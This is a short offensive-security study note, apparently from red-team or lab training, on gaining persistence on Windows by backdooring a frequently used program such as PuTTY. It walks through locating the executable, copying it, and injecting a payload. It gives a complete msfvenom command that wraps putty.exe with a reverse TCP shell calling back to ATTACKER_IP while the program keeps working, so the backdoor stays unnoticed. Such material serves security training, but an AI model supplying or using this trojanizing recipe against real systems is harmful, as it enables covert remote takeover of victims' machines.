#### Goal
Gain persistence by ***modifying files the target user frequently uses*** - without breaking functionality or raising suspicion.
- An `.exe` file (e.g., `Putty`) found on the desktop is likely to be used frequently. So, check the shortcut's properties to ***find the target path***: `C:\Program Files\Putty\putty.exe`.
- Copy the original executable to your attacker machine.
- Modify it by injecting a payload that runs silently alongside the original functionality.

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```